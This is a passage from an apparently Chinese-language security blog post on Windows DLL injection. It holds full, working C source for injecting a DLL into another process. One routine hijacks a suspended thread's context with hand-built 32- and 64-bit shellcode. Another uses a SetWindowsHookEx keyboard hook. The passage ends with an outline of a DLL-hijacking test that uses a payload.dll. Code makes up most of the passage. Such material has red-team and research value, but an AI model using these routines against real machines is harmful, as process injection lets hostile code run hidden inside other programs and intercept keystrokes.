<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="SetThreadContext"><a href="#SetThreadContext" class="headerlink" title="SetThreadContext"></a>SetThreadContext</h4><p>将线程挂起后直接修改线程的上下文，将加载DLL的shellcode注入其中，然后恢复线程，在执行完shellcode后线程就会返回正常执行。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"headers.h"</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">_WIN64</span></span>
BYTE sc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span>
<span class="token punctuation">&#123;</span>
 <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span>	<span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span>
 <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span>
 <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0xC3</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>
BYTE sc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span>
<span class="token punctuation">&#123;</span>
    <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0x9c</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> 
 <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> 
 <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> 
 <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span>
    <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span>
    <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0xC3</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">// !WIN_64</span></span>


<span class="token keyword">void</span> <span class="token function">demoSetThreadContext</span><span class="token punctuation">(</span>LPCSTR pszDllPath<span class="token punctuation">,</span> DWORD dwPid<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 CONTEXT ctx<span class="token punctuation">;</span>
 DWORD dwSize <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 打开进程</span>
 HANDLE hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> dwPid<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>hProcess <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Open process failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 开辟内存</span>
 LPVOID pszDllAddr <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>pszDllAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] VirtualAllocEx failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 写入内存</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> pszDllPath<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Write process memory failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 获取LoadLibraryA函数地址</span>
 PROC pfnProcAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"Kernel32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"LoadLibraryA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>pfnProcAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] GetProcAddress failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 开辟内存，存放shellcode</span>
 LPVOID stub <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>stub <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] VirtualAllocEx failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 获取线程句柄</span>
 DWORD dwThreadId <span class="token operator">=</span> <span class="token function">getThreadId</span><span class="token punctuation">(</span>dwPid<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>dwThreadId <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 HANDLE hThread <span class="token operator">=</span> <span class="token function">OpenThread</span><span class="token punctuation">(</span><span class="token punctuation">(</span>THREAD_GET_CONTEXT <span class="token operator">|</span> THREAD_SET_CONTEXT <span class="token operator">|</span> THREAD_SUSPEND_RESUME<span class="token punctuation">)</span><span class="token punctuation">,</span> false<span class="token punctuation">,</span> dwThreadId<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>hThread <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Open thread failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 挂起线程，获取上下文</span>
 <span class="token function">SuspendThread</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span>
 ctx<span class="token punctuation">.</span>ContextFlags <span class="token operator">=</span> CONTEXT_CONTROL<span class="token punctuation">;</span>
 <span class="token function">GetThreadContext</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">_WIN64</span></span>
 DWORD dwOriginIP <span class="token operator">=</span> ctx<span class="token punctuation">.</span>Eip<span class="token punctuation">;</span>
 ctx<span class="token punctuation">.</span>Eip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>stub<span class="token punctuation">;</span>
 ctx<span class="token punctuation">.</span>ContextFlags <span class="token operator">=</span> CONTEXT_CONTROL<span class="token punctuation">;</span>
 <span class="token comment">// 构造shellcode，写入上下文</span>
 DWORD dwOriginProt <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
 <span class="token function">VirtualProtect</span><span class="token punctuation">(</span>sc<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOriginProt<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">memcpy</span><span class="token punctuation">(</span>sc <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOriginIP<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">memcpy</span><span class="token punctuation">(</span>sc <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pszDllAddr<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">memcpy</span><span class="token punctuation">(</span>sc <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pfnProcAddr<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>
 DWORD64 dwOriginIP <span class="token operator">=</span> ctx<span class="token punctuation">.</span>Rip<span class="token punctuation">;</span>
 ctx<span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>stub<span class="token punctuation">;</span>
 ctx<span class="token punctuation">.</span>ContextFlags <span class="token operator">=</span> CONTEXT_CONTROL<span class="token punctuation">;</span>
 <span class="token comment">// 构造shellcode，写入上下文</span>
 DWORD dwOriginProt <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
 <span class="token function">VirtualProtect</span><span class="token punctuation">(</span>sc<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOriginProt<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">//printf("%p %p %p\n", dwOriginIP, pszDllAddr, pfnProcAddr);</span>
 <span class="token function">memcpy</span><span class="token punctuation">(</span>sc <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOriginIP<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">memcpy</span><span class="token punctuation">(</span>sc <span class="token operator">+</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pszDllAddr<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">memcpy</span><span class="token punctuation">(</span>sc <span class="token operator">+</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pfnProcAddr<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_DEBUG</span></span>
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"shellcode:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x "</span><span class="token punctuation">,</span> sc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">16</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> i <span class="token operator">==</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
 <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> stub<span class="token punctuation">,</span> sc<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">SetThreadContext</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 恢复线程</span>
 <span class="token function">ResumeThread</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Inject DLL by SetThreadContext success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="2-3-消息Hook"><a href="#2-3-消息Hook" class="headerlink" title="2.3 消息Hook"></a>2.3 消息Hook</h3><h4 id="SetWindowsHookEx"><a href="#SetWindowsHookEx" class="headerlink" title="SetWindowsHookEx"></a>SetWindowsHookEx</h4><p>此函数在调用时会传入一个钩子函数，而在对其他进程或全部进程进行Hook时，要求此函数必须位于DLL中，所以只要我们构造的DLL中包含要Hook的函数就可以完成注入。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;tlhelp32.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"headers.h"</span></span>


<span class="token keyword">void</span> <span class="token function">demoSetWindowsHookEx</span><span class="token punctuation">(</span>LPCSTR pszDllPath<span class="token punctuation">,</span> DWORD dwProcessId<span class="token punctuation">,</span> LPCSTR strProcName<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 <span class="token comment">// 获取第一个线程ID</span>
 DWORD dwThreadId <span class="token operator">=</span> <span class="token function">getThreadId</span><span class="token punctuation">(</span>dwProcessId<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>dwThreadId <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Get thread ID failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// 加载DLL和导出的函数</span>
 HMODULE dll <span class="token operator">=</span> <span class="token function">LoadLibraryExA</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> DONT_RESOLVE_DLL_REFERENCES<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>dll <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Open Dll failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>

 <span class="token punctuation">&#125;</span>
 HOOKPROC hookProc <span class="token operator">=</span> <span class="token punctuation">(</span>HOOKPROC<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>dll<span class="token punctuation">,</span> strProcName<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>hookProc <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Get proc of the dll failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token comment">// Hook键盘消息</span>
 HHOOK hHook <span class="token operator">=</span> <span class="token function">SetWindowsHookEx</span><span class="token punctuation">(</span>WH_KEYBOARD<span class="token punctuation">,</span> hookProc<span class="token punctuation">,</span> dll<span class="token punctuation">,</span> dwThreadId<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span>hHook <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Call SetWindowsHookEx failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Inject DLL by SetWindowsHookEx success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] Press any key to unhook:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">UnhookWindowsHookEx</span><span class="token punctuation">(</span>hHook<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Failed to unhook\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Unhook success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 <span class="token function">FreeLibrary</span><span class="token punctuation">(</span>dll<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="2-4-反射注入"><a href="#2-4-反射注入" class="headerlink" title="2.4 反射注入"></a>2.4 反射注入</h3><p>TODO</p>
<h2 id="3-DLL劫持"><a href="#3-DLL劫持" class="headerlink" title="3 DLL劫持"></a>3 DLL劫持</h2><p>DLL劫持是在攻防中会用到的手段，在这里只探讨关于特定程序的简单DLL劫持检测，而不是对系统存在的DLL劫持风险进行检测。<br>我参考<em><strong>DLLHSC</strong></em>项目使用Python实现了简单的DLL劫持测试，没有实现Hook LoadLibrary函数进行动态检测的部分。<br>首先从注册表中获取到系统的KnownDLLs列表，凡是在此列表中存在的DLL都是无法被劫持的。<br>然后获取到程序运行后加载的所有DLL名称(不只是导入表中的，因为导入的DLL还会导入其他DLL)，同时排除掉KnownDLLs列表中已经存在的DLL以及WinSxS目录下的DLL（因为系统会对目录下的DLL加载进行安全验证）。<br>最后将准备好的payload.dll置于程序同一目录下，这个DLL会在加载时在当前目录创建一个temp文件，然后可以通过判断是否存在此文件来验证DLL是否被加载。我们不断地重命名payload.dll为已经获取到的DLL列表中的名称，如果成功创建文件则表明存在DLL劫持；如果程序崩溃则说明payload.dll可能没有实现原先DLL中的某些功能；如果程序正常启动，则认为此DLL不存在劫持。</p>
<h3 id="3-1-获取DLL列表"><a href="#3-1-获取DLL列表" class="headerlink" title="3.1 获取DLL列表"></a>3.1 获取DLL列表</h3><p>使用psutil可以直接获取到进程加载的DLL。</p>
